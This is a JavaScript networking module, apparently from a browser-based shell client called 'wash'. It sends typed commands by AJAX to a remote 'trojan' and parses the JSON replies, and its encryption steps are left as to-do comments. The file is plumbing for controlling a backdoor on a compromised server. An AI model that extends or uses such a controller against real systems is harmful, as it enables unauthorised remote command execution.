/**
 * Encapsulates communicating across the Internet
 */
wash.net = {
    // communicates out to the trojan
    send: function(callback){
        
        // This is unfortunately tight coupling, but here I'm hiding the prompt
        // and context for commands which must communicate with the trojan over
        // the Internet. If I don't do this, the shell produces some really
        // jarring/annoying tearing effects, whereby the prompt/context are
        // drawn and then (milliseconds later) re-drawn when the response
        // arrives from the trojan. By simply hiding these fields until the
        // response is received, the tearing can be eliminated, and the shell's
        // behavior can be made to more closely emulate a real terminal.
        shell.elements.prompt.hide();
        shell.elements.prompt_context.hide();

        // @todo: encrypt here
        var ciphertext = wash.command;

        // make an AJAX request
        $.ajax({
            type : wash.connection.request_type,
            url  : wash.connection.protocol + '://' + wash.connection.domain + wash.connection.url,
            data : ciphertext,
        }).done(function(response){
            // invoke the callback function
            wash.net.receive(response, callback);
        });
    },

    // process communications from the trojan
    receive: function(response, callback){
        // @todo: decrypt here
        var plaintext = response;
    
        // parse the JSON response
        wash.response = JSON.parse(plaintext);

        // invoke the callback function
        callback();

        // Re-display the prompt and context. See the large comment above.  
        shell.elements.prompt.show();
        shell.elements.prompt_context.show();
    },
}
